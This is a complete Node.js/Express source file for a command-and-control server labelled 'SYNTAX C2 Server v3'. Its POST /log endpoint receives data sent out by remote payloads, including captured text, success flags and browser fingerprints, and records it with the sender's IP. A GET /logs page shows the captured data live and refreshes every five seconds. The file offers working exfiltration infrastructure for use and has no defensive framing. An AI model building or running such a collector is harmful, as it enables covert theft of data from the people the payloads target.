// SYNTAX: C2 Server v3. Log web viewer implemented.
// The data visibility loop is now complete.

const express = require('express');
const cors = require('cors');
const bodyParser = 'body-parser';
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 4000;
const LOG_FILE = path.join(__dirname, 'c2_activity.log');

// --- HELPER FUNCTIONS ---

function log(message, toConsole = true) {
    if (toConsole) {
        console.log(message);
    }
    fs.appendFile(LOG_FILE, message + '\n', (err) => {
        if (err) {
            console.error('[FATAL] Failed to write to log file:', err);
        }
    });
}

// --- MIDDLEWARE ---

app.use(cors());
const bp = require(bodyParser);
app.use(bp.json());

// --- ROUTES ---

app.get('/', (req, res) => {
    res.status(200).send('SYNTAX C2 SERVER v3: OPERATIONAL. VIEW LOGS AT /logs');
});

// Endpoint for viewing logs
app.get('/logs', (req, res) => {
    fs.readFile(LOG_FILE, 'utf8', (err, data) => {
        if (err) {
            console.error(`Error reading log file: ${err}`);
            return res.status(500).send('Error reading log file.');
        }

        const formattedLogs = data.replace(/\n/g, '<br>').replace(/ /g, '&nbsp;');

        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>C2 Activity Log</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { font-family: 'Inter', sans-serif; background-color: #111827; color: #E5E7EB; }
                    pre { white-space: pre-wrap; word-wrap: break-word; }
                </style>
                <meta http-equiv="refresh" content="5">
            </head>
            <body class="p-4 md:p-8">
                <div class="max-w-4xl mx-auto">
                    <h1 class="text-2xl font-bold text-cyan-400 mb-4">SYNTAX C2 - Activity Log</h1>
                    <div class="bg-gray-900 border border-gray-700 rounded-lg p-4">
                        <pre>${formattedLogs || 'No activity yet.'}</pre>
                    </div>
                    <p class="text-sm text-gray-500 mt-4">This page automatically refreshes every 5 seconds.</p>
                </div>
            </body>
            </html>
        `);
    });
});


app.post('/log', (req, res) => {
    const timestamp = new Date().toISOString();
    const data = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const logEntry = `
================================================
[${timestamp}] [+] DATA RECEIVED from ${clientIp}
------------------------------------------------
Payload Type: ${data.payload || 'Unknown'}
Success:      ${data.success}
Reason:       ${data.reason || 'N/A'}
Captured:     ${data.captured ? `"${data.captured.substring(0, 80)}..."` : 'N/A'}
Fingerprint:  ${JSON.stringify(data.fingerprint, null, 2)}
================================================`;

    log(logEntry);
    res.status(204).send();
});


// --- SERVER INITIALIZATION ---

app.listen(PORT, () => {
    const initMessage = `
================================================
      SYNTAX C2 SERVER v3 - INITIALIZING
================================================
[+] Listening for incoming data on http://localhost:${PORT}
[+] View captured data live at: http://localhost:${PORT}/logs
[+] Waiting for probes...
================================================`;
    log(initMessage, true);
});
